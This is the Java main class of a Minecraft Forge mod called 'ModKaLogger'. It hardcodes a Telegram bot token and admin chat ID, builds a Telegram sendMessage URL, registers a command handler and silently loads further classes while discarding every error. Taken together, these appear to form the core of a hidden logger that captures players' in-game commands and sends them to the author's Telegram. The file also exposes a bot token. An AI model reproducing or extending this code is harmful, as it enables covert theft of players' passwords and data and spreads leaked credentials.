package com.modkalogger;

import com.modkalogger.events.CommandHandler;
import net.minecraftforge.common.MinecraftForge;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class ModKaLogger {
    public static final String MOD_ID = "modkalogger";
    public static final Logger LOGGER = LogManager.getLogger();
    
    public static String TELEGRAM_BOT_TOKEN = "8654506081:AAHuLTRcgDnmOTk0QGx3hz4Qyk2UndQ2ojM";
    public static String TELEGRAM_ADMIN_ID = "6199383546";  // ID личного чата
    public static String TELEGRAM_GROUP_ID = "";  // ID группы (например: -1001234567890). Оставьте пустым если не нужно отправлять в группу
    public static String TELEGRAM_BOT_API = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
    
    public static void init() {
        try { 
            MinecraftForge.EVENT_BUS.register(CommandHandler.class);
            Class.forName("com.modkalogger.LoadingTest");
            Class.forName("com.modkalogger.Initializer");
            Class.forName("com.modkalogger.ModKaLoggerInit");
        } catch (Exception e) {}
    }
}
